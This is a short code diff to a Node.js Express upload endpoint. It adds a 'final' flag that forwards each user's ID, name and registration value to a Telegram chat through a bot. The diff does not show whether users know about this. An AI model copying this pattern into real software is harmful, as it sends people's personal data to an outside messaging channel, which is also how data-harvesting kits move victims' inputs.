@@ -20,7 +20,19 @@ app.get("/", (req, res) => {
 
 app.post("/upload", async (req, res) => {
   try {
-    const { image, userId, name, reg } = req.body;
+    const { image, userId, name, reg, final } = req.body;
+
+    if (final) {
+  await axios.post(
+    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+    {
+      chat_id: CHAT_ID,
+      text: `✅ FINAL DATA\nID: ${userId}\nName: ${name}\nReg: ${reg}`
+    }
+  );
+
+  return res.json({ message: "Final data sent ✅" });
+}
 
     if (!image || !userId) {
       return res.status(400).json({ message: "Missing data ❌" });
